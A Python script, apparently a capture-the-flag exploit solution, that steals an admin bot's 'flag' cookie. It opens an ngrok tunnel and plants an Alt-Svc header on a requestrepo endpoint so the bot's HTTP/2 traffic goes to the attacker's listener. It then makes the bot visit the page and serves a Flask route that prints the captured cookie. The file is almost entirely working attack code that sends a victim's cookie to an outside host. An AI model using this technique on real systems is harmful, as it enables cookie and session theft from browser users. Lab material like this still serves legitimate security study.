import requests
import os
import ngrok
import base64
from flask import Flask, request, redirect

DOMAIN = os.getenv("DOMAIN") or "192-168-0-90.traefik.me"

http2_listener = ngrok.forward("caddy:443", "tcp", authtoken_from_env=True)
http2_host = http2_listener.url().replace("tcp://", "")
print(f"HTTP/2 listening on {http2_host}")

response = requests.post(url=f"https://{DOMAIN}/requestrepo/api/get_token").json()
token = response["token"]
subdomain = response["subdomain"]

response = requests.post(
    url=f"https://{DOMAIN}/requestrepo/api/update_file",
    params={
        "token": token
    },
    headers={
        "Content-Type": "application/json; charset=utf-8",
    },
    json={
        "headers": [
            {
                "value": f'h2="{http2_host}"; ma=15',
                "header": "Alt-Svc"
            },
            {
                "value": "text/html",
                "header": "Content-Type"
            }
        ],
        "raw": base64.b64encode(b"<!DOCTYPE html><script>location.reload();</script>").decode(),
        "status_code": 200
    }
)

requestrepo_url = f"https://{DOMAIN}/requestrepo/{subdomain}"

app = Flask(__name__)

@app.route("/requestrepo/<subdomain>")
def request_repo(subdomain):
    return redirect(f"https://{DOMAIN}/flag/")

@app.route("/flag/")
def flag():
    print(request.cookies["flag"])
    return "ok"

print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": requestrepo_url}).json())

app.run(host="0.0.0.0", port=80)
